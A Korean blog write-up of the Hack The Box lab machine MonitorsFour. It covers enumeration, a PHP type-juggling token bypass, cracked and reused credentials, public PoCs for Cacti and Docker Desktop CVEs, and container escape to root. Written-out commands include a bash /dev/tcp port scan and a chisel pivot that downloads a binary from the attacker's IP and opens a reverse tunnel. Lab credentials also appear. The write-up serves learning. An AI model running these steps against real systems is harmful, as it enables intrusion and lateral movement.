---
title: "[HTB] MonitorsFour (Easy_Windows)"
date: 2025-12-17 19:25:43 +09:00
categories: [hacking, saturnx operators, Windows]
tags: [Hack The Box]
pin: true
password: "202512202248"
---

![MonitorsFour clear](https://github.com/user-attachments/assets/a679d8fe-6b3d-4a83-a68a-04a20a52c704)

## 시작에 앞서

![MonitorsFour](https://github.com/user-attachments/assets/ae9a3b3a-c020-46e6-82d7-df31fccbc764)

이번에 해볼 문제는 `Easy Window`문제이고 별이... 3.4네? 그리고 지난번에 했던 윈도우 문제와 다르게 이번엔 계정이 없다.

그리고 찾아보니 원래 `Monitors` 시리즈로 4번째 라더라.

![how to](https://github.com/user-attachments/assets/8d219ce1-1ebf-4f49-9e66-485e6f7a5cea)

일단은 Active 머신이라(2025년 12월 17일 기준) 문제는 뭐 딱히 볼 것도 없다. 바로 연결하고 시작!

## 정찰 및 정보 수집 (Reconnaissance & Enumeration) 

![default setting](https://github.com/user-attachments/assets/013dfe94-a6ca-4bf2-8902-d9439c2c7600)

일단 매번 하던 네트워크 설정을 해주고,

![nmap result](https://github.com/user-attachments/assets/a0acf537-57a2-4e0b-837b-02cd460a4ee9)

nmap을 돌려주면, 80번 http포트와 이상한 5985번 포트가 열려있다. 근데 이건 

![5985](https://github.com/user-attachments/assets/0d24ce97-2a69-4197-9bdf-218b03ecb2ce)

그렇다고 하니 winrm이 켜져있구나 하고 생각하면 되겠다.

![monitorsfour.htb](https://github.com/user-attachments/assets/aa0f8aa3-8947-4e1f-9bfc-70d50ceabd91)

사이트에 접속해보니 네트워크 솔루션 이야기가 나오는 사이트다.

![cost](https://github.com/user-attachments/assets/aa407841-a13c-4cdb-8dd1-238d8de9d805)

오메 비싼거...

![etc](https://github.com/user-attachments/assets/ca889758-5b82-43b2-9f6e-4b6544f730db)

그리고 이것저것?

근데 저건 다 한 페이지(monitorsfour.htb)에 존재하는 내용들이라 그닥 쓸모가...

![login](https://github.com/user-attachments/assets/68d5c9fd-d5e7-41dc-a211-6bed643a2d0b)

로그인 페이지는 있는데 회원가입 페이지는 없네..? 신규 회원은 가입하지 말란거요?

## 초기 침투 (Initial Foothold / Exploitation)

![gobuster too long](https://github.com/user-attachments/assets/3f8f1d36-4c3c-40d3-b1be-dad68687c716)

일단 내가 찾지 못한 페이지가 있는가 해서 `gobuster`로 싹 찾아보는데 어째 너무 오래 걸리기에 다른 워드 리스트, 도구를 사용해보기로 했다.

![gobuster](https://github.com/user-attachments/assets/66ce2b3c-db20-421d-a14d-b350db1cf567)

워드 리스트는 `common.txt`를 사용했고 `gobuster`를 썼다.

![dirsearch](https://github.com/user-attachments/assets/15ebae10-157b-4621-935f-5ababf9c6f56)

위는 `dirsearch`이고 이건 딱히 워드리스트 설정 안한 상태일 때에 뭔가 더 발견했다.

![feroxbuster1](https://github.com/user-attachments/assets/2a35a598-5c9e-4cd7-a864-e98ea50f0605)

![feroxbuster2](https://github.com/user-attachments/assets/6ae0d145-c314-4b08-b889-639e1899e78f)

위는 `feroxbuster`로 스캔한 결과이며 12분 걸렸다.. 그래도 훨씬 자세하니 좋았으?

일단 위 여러 도구를 사용했을 떄의 결과로 보자면 공통되게

```
http://monitorsfour.htb/ 
http://monitorsfour.htb/controllers/ 
http://monitorsfour.htb/static/ 
http://monitorsfour.htb/static/admin/ 
http://monitorsfour.htb/views/ 
http://monitorsfour.htb/views/admin/ 
```

정도가 발견되는 것을 확인할 수 있었고 유일하게 워드리스트를 사용하지 않은 `dirsearch`에서는 `.env`, `.ht_wsr.txt`, `.htaccess.bak1` 등의 파일(?)도 찾아낼 수 있었다.

좀 더 찾아보니 워드리스트의 이슈라고 하는데, `common.txt`의 경우엔 `.env`와 같은 특수 파일을 놓칠 수 있다고 한다. 이래서 시간이 많으면 좀 더 제대로된 워드 리스트를 쓰던가 아니면 도구를 여러가지 다 써봐야하는게다.

`dirsearch` 기준으로 봤을 때에

![user](https://github.com/user-attachments/assets/6bc46963-5f04-4acb-b99e-8388a64aae9e)

유저 페이지는 로그인을 못했으니 없고

![contact](https://github.com/user-attachments/assets/cc6abeb9-5fb8-4ea1-b47a-0d0924b217d2)

contact 페이지는 뭔가 오류가 파바박 뜨는데 `Router.php` 폴터에서 코드에 오류가 났단다.

![views](https://github.com/user-attachments/assets/ae11d697-97fb-4202-a580-fd4c40d8bd46)

views는 메인 페이지에서 뼈대만 남은거고

![static](https://github.com/user-attachments/assets/f59a05ed-3e0a-4344-87fd-629af3bb06f0)

static은 403이 뜬다.

![.env](https://github.com/user-attachments/assets/394e3e4f-e5fb-47b2-935c-923a9f54d265)

그리고 대망의 `.env`파일에서는 `MariaDB`에 접속하기 위한 정보를 찾아낼 수 있었다.

![혹시](https://github.com/user-attachments/assets/26dbd6a9-bdb1-458b-b1de-f42e07fffeb8)

설마 하는 마음에 로그인 시도해봤는데 역시 안된다.

그리고 솔직히 나는 여기서 완전 막혔었는데 gemini와 이야기 하다보니 몇 가지 시도를 해봤고 그에 따라 VHOST를 스캔해야 한다고 헀다.

- login : 실패 (어떤 조합으로도 안됨)
- port scan (nmap) : 80과 5985만 존재
- 디렉토리 스캔 (gobuster, feroxbuster, dirsearch) : 해서 나온 결과가 .env

그리고 이제 이 메인 도메인에서 우리가 찾을 수 있는 내용들은 모두 찾았으니 `http://monitorsfour.htb/`가 아니라 서브도메인을 찾아볼 시간인 것이다!

[WIX Blog / 서브 도메인](https://ko.wix.com/blog/post/what-is-a-subdomain)

[Elifunt / 도메인](https://elifunt.kr/blog/seomarketing/seo-sub-main-domain/)

[hongchee.log / 도메인 연결 및 서브 도메인이란](https://velog.io/@hongchee/%EB%8F%84%EB%A9%94%EC%9D%B8-%EC%97%B0%EA%B2%B0-%EB%B0%8F-%EC%84%9C%EB%B8%8C-%EB%8F%84%EB%A9%94%EC%9D%B8%EC%9D%B4%EB%9E%80)

내가 도메인이나 서브도메인에 대한 지식이 없다보니 이 기회에 아예 좀 더 찾아보며 공부했다.

![gemini 왈](https://github.com/user-attachments/assets/6f670bef-9990-440e-8040-6c3012260012)

당최 왜 저 `.env`를 찾고 나서 서브 도메인을 찾아야하는 것인지 gemini랑 이것저것 이야기하다보니 이번 문제의 이름처럼 모니터링 도구의 경우 메인 홈페이지와 분리해서 서브도메인으로 운영하는 경우가 있다고 한다.

"주운 열쇠가 현관문에 안 맞으니, **별채(서브도메인)** 가 있는지 찾아보자!"

라는데 참 인공지능이 공부할 때에 비유를 잘해준단 말이지.

![공격 구조도](https://github.com/user-attachments/assets/0190fce6-fe59-4440-9cae-dff74958dd55)

게다가 이렇게 직접 구조도까지 그려서 알려준다. 좋은 도우미가 아닐 수 없다 이거야. 뭔가 어째 공부 하면서 해킹 실력보다 ai 쓰는 능력이 더 발전하는 느낌?

![ffuf result](https://github.com/user-attachments/assets/92db0c5d-e570-4aba-9e2f-3f34db0cae5f)

ffuf를 이용해 확인하니 `cacti`라는 이름의 서브도메인을 찾아낼 수 있었다.

![/etc/hosts2](https://github.com/user-attachments/assets/afab6df0-76e5-4f0e-af33-376b3c168c88)

호스트 파일에 도메인 추가하고 

![cacti](https://github.com/user-attachments/assets/99590ed7-be42-4d11-a4d7-08f1927fae68)

이 cacti가 무엇인고 하여 찾아보니 네트워크 모니터링 도구라 한다. 어쩐지 문제 이름이 `monitorsFour`더라니.

![cacti](https://github.com/user-attachments/assets/7b5cf03b-05d5-4dce-87ef-6f66abb2eda0)

짜잔! 이렇게 cacti에 들어올 수는 있었는데... 엄... 로그인 페이지네? 그래도 일단 버전이 `1.2.28`이라는 것은 확인했다.

아니 근데 이번에도 뭐 로그인이 되지는 않는데?

![vuln](https://github.com/user-attachments/assets/e26f208f-fd8e-4d0b-a7e9-134c31a2a999)

찾아보니 이 다음 버전에 고쳐진 취약점이 있다. 근데 이거 찾아보니 로그인에 성공해야지만 가능하다네..? 끄엑

엄...그리고 이후에 아무리 해도 막혀서 다시 돌아가 `dirsearch`를 했던 부분의 페이지들을 살펴보다가 `monitorsfour.htb/user`에서 url을 보다가 

그래 `token`이 없다고 했으니까 `token`을 파라미터로 넣어줄까? 하여 `?token=0`을 했더니...

![why](https://github.com/user-attachments/assets/a4081265-7d8d-4fa0-8ff1-76296f5ed2ac)

왜 된거죠? 왜요? 아니 진짜 이해가 안되서 그래...

![why token?](https://github.com/user-attachments/assets/c0db59d5-2023-4514-98ba-404b0bc1ca04)

이건 알겠고.

![Type Juggling](https://github.com/user-attachments/assets/479e246b-a032-4da3-8751-f31ee90dfb7b)

어... 그니까 이번 문제의 이 `user`페이지는 PHP로 만들어져있고 그 내부에서 `==`이 문자열과 숫자를 비교하다가 찐빠를 내서 그냥 True 값이 되어버렸다는 이야기?

[HAHWUL / Type Juggling](https://www.hahwul.com/cullinan/attack/type-juggling/)

[MOONDING / PHP Type Juggling 취약점](https://www.moonding.co.kr/php-type-juggling-vulnerability/)

[PHP Type Juggling Magic Hash](https://hg2lee.tistory.com/entry/PHP-Type-Juggling-Magic-Hash)

아주 정확히 이해했다!

뭔가 이상하게 성공하긴 했지만 ㅋㅋㅋ

![what i got](https://github.com/user-attachments/assets/5da6f6b3-e0f6-42b6-8312-0a0ee2c3ff5e)

일단 내가 얻은걸 좀 살펴보니 비밀번호가 뭔가 문자열로 되어있는데 이거 당연하게도 뭔가의 암호화겠지?

![md5 hashcrack](https://github.com/user-attachments/assets/86543b92-3ea5-457b-aff1-c6f579c8469c)

이번에도 전과 같이 CrackStation에서 해시 크래킹을 진행했고 admin을 제외한 나머지 비밀번호는 해시 크랙킹 하는데 실패했다. 그래도 admin 얻었으니 좋았다!

![admin](https://github.com/user-attachments/assets/70e63aec-acfd-405b-916d-0846ad3b0143)

일단 메인 도메인(monitorsfour.htb)에서는

```
admin / wonderful1
```

을 이용해 로그인에 성공했고

![marcus](https://github.com/user-attachments/assets/ea4aeb23-8868-45da-8eb2-a4ee12077ccb)

cacti에서는

```
marcus / wonderful1
```

로 로그인에 성공할 수 있었다.

`사용자 이름 유추`와 `비밀번호 재사용` 문제랄까..?

일단 그건 넘기고 우리가 할 수 있는 것을 하자!

![월급을 0으로](https://github.com/user-attachments/assets/7fb0066d-d6cc-44d8-8068-75b52e32606c)

월급을 빵원으로!! 가 아니라

[TheCyberGeek/CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)

아까 찾았던 poc가 있으니 그걸 이용할 때이다.

![cve](https://github.com/user-attachments/assets/de6f158b-b853-48ad-8a31-1a2a724c36de)

일단 뭐.. msf에는 없으니 github에 올라온 cve를 이용하자.

![following](https://github.com/user-attachments/assets/298f1928-a7bc-4092-8733-2c31cc0ed5e0)

설명에 나온대로 따라서 진행하자

![didit](https://github.com/user-attachments/assets/46536c5b-2233-4b6a-8263-8aa1ecf15359)

성공이다!

![어이쿠](https://github.com/user-attachments/assets/020baa8f-7f14-48c0-aaf5-1cebb374baba)

일단 /bin/bash를 불러오기엔 python이 없고 생각해보니 지금 위치가 `/html/cacti`였다.

![why](https://github.com/user-attachments/assets/4e02af5d-065e-4829-a040-1b3fe673bced)

그리고 무심결에 바로 `home` 디렉토리로 가 `home/marcus`에 들어가고 생각한건데

아니 나 marcus가 아닌데요?

아 나님 바보

`drwxr-xr-x 1 marcus marcus 4096 Dec 17 04:04 marcus`

Others 권한이 `r-x` 즉 읽기, 실행으로 설정되어있었다.

![cat user](https://github.com/user-attachments/assets/b8096199-25e0-4e21-9ff9-fd7263071558)

짜잔~!

![not easy](https://github.com/user-attachments/assets/d7902a60-bda1-44de-833f-0e403a1a1e59)

낫 이지!! 는 솔직히 개인적인 감상이라.. 아니 저거 token에서 php 이슈가 생길거라곤 생각을 못했지요.

솔직히 easy라기에 퇴근하고 쑥 끝내려 했는데 어림도 없지 user flag 까지만 하고 오늘은 이만 자러 가야겠다.

그래도 새로운 것들 많이 알았으니

![좋았쓰](https://mblogthumb-phinf.pstatic.net/MjAyNDA5MTVfMTAz/MDAxNzI2Mzk4NzkyNjk2.FnaQ5HvOzuWcoW9gGy4qI6Zyc65X7mrHAC8kPHZ0LLsg.ziq6vF9XT5vdeJgX7jykr98j3b3CKOMGtvlRksEDW7Qg.JPEG/IMG_0043.JPG?type=w800)

아니 근데 그래서 maria db의 행방은?

## 권한 상승 (Privilege Escalation) 

![winrm](https://github.com/user-attachments/assets/63c49e0a-b9bb-44ee-9228-6700628e63e4)

다시 돌아와서 저번에 얻었던 `marcus/wonderful1`을 5985번 포트에 열려있던 winrm을 통해 접속을 시도하니 성공했다.

![what](https://github.com/user-attachments/assets/efe56a41-beac-4bc7-bc4a-ab731b6da72a)

음? 보아하니 marcus는 winrm을 사용할 수 없는 걸수도? (요건 다른 윈도우 계정 문제 보고 오면 이해 하실 수 있습니다!)

![docker](https://github.com/user-attachments/assets/7a8a8844-6e23-4f14-affa-31137e9ff1e7)

그리고 이후에 어떻게 해야할까 제미나이와 이야기를 하다보니 지금 이 리버스 쉘이 도커 환경안에 있다는 이야기를 하여 `/` 디랙토리를 리스팅 해보니 역시 `.dockerenv`가 있는 것을 알 수 있었다!

그니까 외부에서 스캔(`nmap`)해 보았을 땐 `OS: Windows`에 `5985(WinRM)` 포트가 열려있었기에 HOST는 Windows가 맞으나 리버스쉘로 연결되었을 때에는 `ls, bash, /home` 등이 가능하다는 것으로 미루어보아 `Linux` 환경이가는 것을 알 수 있다.

고로 여기서 우린 지금 `WSL(Windows Subsystem for Linux)`로 돌아가고 있거나 `Docker` 환경임을 짐작할 수 있고 `.dockerenv` 파일을 통해 Docker라고 확정 지을 수 있는 것!!!

그리고 애초에 `Cacti(웹 서비스)`를 돌리고 있으니 도커라고 볼 수 있다.

![why not](https://github.com/user-attachments/assets/cecfaad7-70f6-4a2c-a6da-6f92a036cf19)

인공지능은 답을 찾는데 도움을 줄 뿐 이해는 내가 해야하는 것!

그러면 이제 이 도커 환경을 탈출할 방법을 찾아야겠지?

![윈도우 환경 도커 탈출](https://github.com/user-attachments/assets/6fdcef18-a672-4eef-946e-0b49914edd76)

[도커 데스크톱 치명적 보안취약점, 윈도우 호스트 장악 가능…긴급 업데이트 필요](https://www.dailysecu.com/news/articleView.html?idxno=169074)

아니 이게 있네?

그리고 이제 이걸 어떻게 써야하나 제미나이와 이야기를 해보니 내부망이 어떻게 되어있나 확인을 해보자고 한다.

![네트워크 확인](https://github.com/user-attachments/assets/3b510396-4c43-463c-93de-6114c1f70145)

위 `ip route show` 를 통해 호스트(Windows)의 내부 IP 가 `172.18.0.1`이라는 것을 확인할 수 있었다. 그리고 도커 네트워크의 게이트웨이가 호스트라고 한다.

근데 이제 좀 더 자세히 알아보기에 앞서 네트워크 스캔을 위한 `nmap`이 없으니 이걸 bash를 이용해서 구현할 수 있다고 한다.

```bash
for port in 21 22 23 25 53 80 88 135 139 389 443 445 593 636 1433 2375 2376 3306 3389 5985 5986 8080 8443; do timeout 1 bash -c "echo >/dev/tcp/172.18.0.1/$port" 2>/dev/null && echo "Port $port is open"; done
```

![scan](https://github.com/user-attachments/assets/8f3ce97a-0ccb-4b4f-830f-4b34d8a10e3d)

오... 아쉽게도 우리가 찾던 2375 포트는 없고 80번이나 3306번 포트가 열려있음을 확인했다.

뭔가 저 포트 익숙하지 않은가? 바로 저 위에서 찾았던 `.env`파일! 그 안에 들어있는 포트다!

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

![dumpshell](https://github.com/user-attachments/assets/c97448b7-b043-4aab-920b-8965509b466b)

확인해보니 mysql도 깔려있고, mariadb에도 접속을 할 수는 있는데...

아니 이거 또 dumpshell 이슈가..

![chisel reverse wrong](https://github.com/user-attachments/assets/2e8a5e54-6081-44ea-a2ba-07b305a29bb6)

아니.. 근데 왜 리버스 쉘이 또또또 멈췄다. 벌써 진행하면서 8번짼데 이거 왜 이러니...

### chisel 터널링

![받는쪽](https://github.com/user-attachments/assets/5f6dcffd-1ef8-4f06-a2d7-9531adb3d166)

![공격하는 쪽](https://github.com/user-attachments/assets/742efcfc-7247-4aa3-bfec-4e8f24220387)

![넘길 때](https://github.com/user-attachments/assets/dffe518b-396f-4127-b345-a352f3c57c2e)

일단 이 작업을 위해선 되게 많은 쉘을 켜야하는데 kali라면 `ctrl + shift + R`을 눌러 쉘을 나눌 수 있다!

> 1번 쉘 (kali 에서 chisel 보낼 때)

```bash
$ which chisel
/usr/bin/chisel

$ cp /usr/bin/chisel .

$ ls
chisel  exploit2.py  exploit.py  README.md  venv

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.98 - - [19/Dec/2025 09:20:57] "GET /chisel HTTP/1.1" 200 -
```

> chisel 서버 (kali)

```bash
$ chisel server -p 8000 --reverse
2025/12/19 09:14:48 server: Reverse tunnelling enabled
2025/12/19 09:14:48 server: Fingerprint AcScc6lvQKS8zvAiSTBa6XUhH2nuoO2f1MHdmkW1N48=
2025/12/19 09:14:48 server: Listening on http://0.0.0.0:8000
```

> 받는쪽 (피해자)

```bash
$ curl http://10.10.15.126/chisel -o chisel

$ chmod +x chisel

$ ./chisel client 10.10.15.126:8000 R:3306:172.18.0.1:3306
<sel client 10.10.15.126:8000 R:3306:172.18.0.1:3306
2025/12/19 14:21:15 client: Connecting to ws://10.10.15.126:8000
2025/12/19 14:21:18 client: Connected (Latency 556.394391ms)
```

참고로 보면 알겠지만 터미널들을 끄면 안된다.

물론 chisel 보낼 때 쓴 터미널만 뺴고.

![all complete](https://github.com/user-attachments/assets/7fd334e2-6638-49a8-88f9-32b6f236a83b)

보아하니 위와 같은 모습이 된다.

더 깔끔하게 쓰려면 tmux를 이용하면 되겠지만 난 이정도여도 만족!

### 다시 문제로 돌아와

![mariadb](https://github.com/user-attachments/assets/91743870-c43d-477d-a5ce-4952427f7294)

보다싶이 드디어! dumpshell을 벗어나 kali에서 쉘을 열어 mariaDB를 이요할 수 있게 되었다!

![database](https://github.com/user-attachments/assets/22efdd43-a9ac-496f-8f96-8fbae6e94c82)

딱 보니 monitorsfour_db가 우리가 찾는거겠지?

![users](https://github.com/user-attachments/assets/61e08541-55d0-4a03-8b7d-13ca9eb0cca7)

엑.. 근데 보아하니 password가 암호화 되어있다.

아니 그리고 저거 이미 찾은거 아닌가? 맞잖아? admin 해시 풀어보면 `wonderful1`나오는거니까... 수미상관?

![customers](https://github.com/user-attachments/assets/be05d85c-36ab-47f2-b884-686c896e9680)

난 나쁜 해커가 아니니까 의미 없고

![changelog](https://github.com/user-attachments/assets/f3b52515-e9e6-4417-95f4-7cab96aa8cd2)

changelog도 원래 웹에서 볼 수 있는 내용이고...

![dashboard](https://github.com/user-attachments/assets/3db0a1bc-b997-4fa0-9450-97e2b651c119)

역시다.. 이러면 굳이 더이상 이 mariadb를 볼 필요가 없어지는데...

![리셋 한번](https://github.com/user-attachments/assets/8a3ebd7c-6e5d-40c3-a449-5b1f8dc7ad6e)

한번 리셋을 진행했다.

### 다음날

어제와 동일하게 저 CVE는 쓸 수가 없으니 내가 혹시 빼먹은 것이 있지 않을까 하여 좀 더 둘러보기로 했다.

![mount](https://github.com/user-attachments/assets/33cc5e5e-ec5e-4dfd-a883-3f38b84088fa)

일단 마운팅된 정보는 위와 같고...

![네트워크](https://github.com/user-attachments/assets/493fa675-ff93-470d-a9e6-13d14289c1c0)

네트워크 정보는 다를거 없고

근데 보아하니 `df -h` 결과를 통해 윈도우 C 드라이브가 마운팅이 안되어있는 것을 확실히 알 수 있었다.

그리고 그럼 내가 더이상 할 수 있는게 뭘까 했는데 gemini가 말하길

![api 80](https://github.com/user-attachments/assets/5375dcf0-9034-4260-8cab-793220c58e18)

80번 포트가 열려 윈도우와 통신하고 있으니 이 열린 포트를 통해 RCE를 실행시키자고 한다.

![scan](https://github.com/user-attachments/assets/a9d64db4-8e7a-4c70-83c4-17e7203dafff)

```shell
for word in users admin status version command upload shell run configure system logs backup; do
  echo -n "Testing /api/v1/$word ... "
  curl -s -o /dev/null -w "%{http_code}" -H "Host: monitorsfour.htb" -H "Authorization: Bearer 663bdc7a236f81638d" http://172.18.0.1/api/v1/$word
  echo ""
done
```

간단한 명령어를 만들어 API에 쓰이는 주소를 싹 스캔해보니 `/api/v1/users` 가 200이 뜨는걸 확인할 수 있었다!

근데 이거 그냥 monitorsfour 웹 사이트잖아? 의미가 없는데...

![index.php](https://github.com/user-attachments/assets/70d6422b-a839-4e40-a3c1-737673ca8a8e)

일단 `/app/index.php`를 통해 api 리스트는 얻었다. 만.. 다 확인해봐도 딱히...?

![외부 서버 ip가 다른데?](https://github.com/user-attachments/assets/7ed7793c-9959-47b7-aa8d-2e08c93192cd)

어... 아니... 그 이 도커에서 연결된 ip를 찾아보려고 좀 더 찾아보다가.. 아니 잠만 뭔가 잘못 생각한거 같은데? gemini형? 이거 아니잖아요?

- 172.18.0.3 : Cacti 컨테이너
- 172.18.0.2 : MariaDB 컨테이너
- 172.18.0.1 : 게이트웨이
- 127.0.0.11 : 도커 DNS
- 192.168.65.7 : 넌 누구니?

[[Docker] 도커 네트워크 / by @seungwook_TIL](https://rebugs.tistory.com/752)

![docker](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FFefOI%2FbtsJt5xbBYs%2FAAAAAAAAAAAAAAAAAAAAAFWuk4HpTTmQpJvhNsCAOaeZYd_UxfNxxlSbdBSUCpCs%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1767193199%26allow_ip%3D%26allow_referer%3D%26signature%3DUOr78ktIpBV7JLYLD1pQN4bUS04%253D)

위 블로그의 내용을 참고해보니 저 ip는 외부에서 이 window 머신으로 가는 네트워크와 관련되어 있는 ip인거 같은데...

애초에 `#`으로 되어있으니 의미도 없고.. 인데...?

![192 scan](https://github.com/user-attachments/assets/3ddda220-4979-4be9-a091-c4af3fadc11e)

아니 왜 스캔이 되죠? 아니 애초에 이게 되는게 맞아? 무슨 원리로?

![gemini](https://github.com/user-attachments/assets/cfa7ade4-f018-4eee-b865-76ad8d707701)

일단 제미나이 선생은 이리 말했는데...

밥 먹고 와서 다시 차분히 알아보니 어째 사실상 처음에 CVE에 대해 좀 더 자세하게 들여다봤다면 이미 문제를 풀었을지도 모르겠다는 생각이 든다.

[Windows/macOS Docker Desktop SSRF 취약점 (CVE-2025-9074)](https://ggonmerr.tistory.com/655)

[도커 데스크탑(Docker Desktop) 취약점 보고서: CVE-2025-9074](https://s2w.inc/ko/resource/detail/929)

![기본 엔드포인트](https://github.com/user-attachments/assets/7f6d5956-7196-49d8-aaf0-744ea9565351)

애초에 이 취약점이 발생하는 API 엔드포인트가 `192.168.65.7`이라 했었다.

![about CVE](https://github.com/user-attachments/assets/9e019901-807b-4e6c-95a3-50cd4b3d109f)

아 좀만 더 자세히 차분히 볼껄...

### 그래서 이제 진짜 권한 상승

![/etc/resolv.cof](https://github.com/user-attachments/assets/7ed7793c-9959-47b7-aa8d-2e08c93192cd)

다시 돌아와 우리는 현재 시스템이 Docker Desktop (버전 4.44.2)라는 것을 admin으로 웹에 로그인 했을 때 뿐 아니라 내부 파일들을 둘러보며 확인할 수 있었다.

게다가 그에 따른 취약점 검색을 통해 `CVE-2025-9074`가 존재함을 확인하였고 `/etc/resolv.conf` 파일 내의 Nameserver 주소를 통해 Docker Host(API 엔드포인트)의 IP가 `192.168.65.7` 라는 사실도 확인할 수 있었다.

![portscan](https://github.com/user-attachments/assets/4399c30d-4fbe-4c42-9fcb-512d55e0974e)

그리고 또한 간단한 포트 스캔을 통해 CVE에 활용할 `2375`포트가 열려있음을 확인했다.

### CVE-2025-9074 이용하기

[BridgerAlderson/CVE-2025-9074-PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC)을 이용했다.

![root get](https://github.com/user-attachments/assets/2be6c493-9008-4b34-b4db-665f71d7cd9d)

그리고! 성공!

자세히 보면 알 수 있겠지만

![root](https://github.com/user-attachments/assets/2bbbe038-2811-4d52-a52c-4a32971e6eb1)

지금 `@`뒤의 부분이 아까의 `821fbd6a43fa`이 아니라 `34f81571e856` 즉 이번 CVE의 특징인 다른 새로운 컨테이너를 만들어서 그것의 권한을 통해 루트 권한을 획득했음을 알 수 있다.

![root?](https://github.com/user-attachments/assets/55899d7b-630c-4c05-84f2-db1b4ea57ba2)

근데 flag께선 어딜 가셨소?

![why?](https://github.com/user-attachments/assets/7be0fd1e-53b9-4a3e-8beb-9aa6d66140c1)

아니 왜 여기도 없는데?

![why here](https://github.com/user-attachments/assets/0d89d04f-9623-4b05-9c01-dff7fe3d904a)

윈도우 문제는 root 플래그가 `/c/Users/Administrator/Desktop`에 있네? 진짜 이거 찾으려고 내부를 싹 뒤졌다.

일단 `/host_root/mnt`까지는 도커에서 윈도우 드라이브 마운팅 한 부분이고, `/c/Users/Administrator/Desktop`은 이후 C드라이브에서 유저중에 관리자 계정의 바탕화면에 root 플래그가 존재한다. 요건 좀 외워둬야할듯 하다.

![hard](https://github.com/user-attachments/assets/72b80786-8d0f-40f6-9153-913f6dea4be3)

이게 어떻게 Easy야!!! hard나 먹어라!!

## 마치며

[MonitorsFour has been Pwned!](https://labs.hackthebox.com/achievement/machine/988787/814)

![Pwned](https://github.com/user-attachments/assets/46dda9af-3604-4868-a978-f7959b840275)

와... 솔직히 난 윈도우 문제 하면 또 bloodhound 켜고 계정 연결하고 여기 저기 이동하거나 할줄 알았지 Easy 문제에서 도커 탈출을 시킬줄은...

솔직히 이번 문제에서 삽질을 많이 하게 된 이유가 내가 docker라는 것에 대해서 사실상 문제를 푸는데 있어 필요한 핵심 지식들이 없는 상태에서 진행을 했다보니 이번처럼 삽질을 많이 하게 된 듯 하다.

어째 문제 풀 때마다 배우는게 계속 늘어나네? 뭔가 재밌기도 하고 머리아프기도 하고.

일단은 문제 푸는데에 집중을 했다보니 발표자료 만들면서 다시 좀 더 정리해야겠다!